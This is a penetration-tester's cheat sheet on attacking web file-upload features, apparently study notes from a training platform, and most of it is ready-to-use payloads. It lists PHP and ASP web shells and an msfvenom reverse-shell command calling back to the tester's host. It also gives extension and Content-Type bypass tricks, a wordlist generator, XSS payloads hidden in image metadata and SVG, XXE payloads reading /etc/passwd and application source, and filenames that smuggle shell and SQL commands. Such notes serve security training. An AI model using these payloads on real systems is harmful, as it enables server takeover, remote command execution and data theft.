# File Upload Attacks

**Tips:** 
- Find what language runs the web app by fuzzing the extention of the index page for common file types (/index.FUZZ).
- "Open image in new tab" to see upload location (maybe encoded in the URL).

[Wappalyzer](https://www.wappalyzer.com/) can also be used to detect what languages and othertechnologies are used.

## Web Shells

| Web Shell | Description |
|-----------|-------------|
| `<?php echo file_get_contents('/etc/passwd'); ?>` | Basic PHP File Read |
| `<?php system('hostname'); ?>` | Basic PHP Command Execution |
| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP Web Shell |  
| `<% eval request('cmd') %>` | Basic ASP Web Shell |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell |
| [PHP Web Shell](https://github.com/Arrexel/phpbash) | PHP Web Shell |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP Reverse Shell |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

## Bypasses

| Command | Description |
|---------|-------------|
| **Client-Side Bypass (firefox shortcuts)** | |
| `[CTRL+SHIFT+C]` | Toggle Page Inspector and amend front end code (also inspect displayed files after upload to find location) or use burp to alter request |
| `[CTRL+SHIFT+K]` | Load browser console to review JS functions by typing their name in |
| **Blacklist Bypass (Can terst in burp intruder tab(may need to diable URL encoding))** | |
| `shell.phtml` | Uncommon Extension |
| `shell.pHp` | Case Manipulation |
| [PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) | List of PHP Extensions |
| [ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) | List of ASP Extensions |
| [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) | List of Web Extensions |
| **Whitelist Bypass (try fuzzing with web exstentions wordlist first to see what are accepted)** | |
| `shell.jpg.php` | Double Extension |
| `shell.php.jpg` | Reverse Double Extension (works when missconfigured webserver will execute because contains php and whitelist allows jpg (may need fuzzing php ext also (php7.jpg etc))) |
| `%20, %0a, %00, %0d0a, /, .\, ., …` | Character Injection - Before/After Extension |
| **Content/Type Bypass (Content-Type header check), fuzz contrent type in burp** | |
| [Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) | List of All Content-Types |
| [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) | List of File Signatures/[Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime) (first bytes of a file indicate its MIME-type) |

**Note:** A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as POST data), in which case we will need to modify the main Content-Type header.

### Creating Character Injection Wordlist

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do # can add more php ext here
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

### Limiting Content-Type wordlist example

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt # method 1
cat web-all-content-types.txt | grep 'image/' | xclip -se c # method 2
```

## Limited Uploads

- Secure filters not exploitable with above techniques
- Fuzz file extensions to try below techniques

| Potential Attack | File Types |
|------------------|------------|
| XSS | HTML, JS, SVG, GIF |
| XXE/SSRF | XML, SVG, PDF, PPT, DOC |
| DoS | ZIP, JPG, PNG |


### XSS 

- Adding XSS payload to an image's metadata:

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg
```

- Change the image's MIME-Type to text/html, web apps may show it as an HTML document instead of an image, thus the XSS payload would be triggered.
- Scalable Vector Graphics (SVG) images are XML-based. For this reason, we can modify their XML data to include an XSS payload: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

### XXE

- SVG/XML example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

- Another example but to read the web apps source code:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

- View page source of the upload page to see the returned file from above payload.
- PDF, Word Documents, PowerPoint Documents all include XML elements.

## Other Upload Attacks

| Attack Type | Description |
|-------------|-------------|
| Injections in File Name | When file name is displayed on page (reflected) e.g. `file$(whoami).jpg`, ``file`whoami`.jpg``, `file.jpg\|\|whoami`, `<script>alert(window.origin);</script>.jpeg`,    `file';select+sleep(5);--.jpg` |
| Upload Directory Disclosure | When no access to the link or uploaded file, use other methods to find the uploads directory i.e. fuzzing, LFI, XXE, forcing error messages (upload file with a name that already exists/extremely long name) |
| Windows-specific Attacks | Using reserved characters (|, <, >, *, or ?) or reserved names (CON, COM1, LPT1, or NUL) may cause an error to display the upload directory. Use Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files e.g. WEB~1.CON to overwrite the web.conf file |